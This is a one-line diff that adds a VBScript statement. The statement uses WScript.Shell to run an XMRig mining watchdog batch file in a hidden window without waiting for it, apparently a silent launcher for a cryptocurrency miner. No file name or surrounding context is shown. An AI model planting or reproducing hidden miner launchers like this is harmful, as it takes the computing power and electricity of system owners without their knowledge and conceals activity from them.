@@ -1,0 +1,1 @@
+Set s=CreateObject("WScript.Shell"):s.Run "C:\mining\xmrig\watchdog.bat",0,False
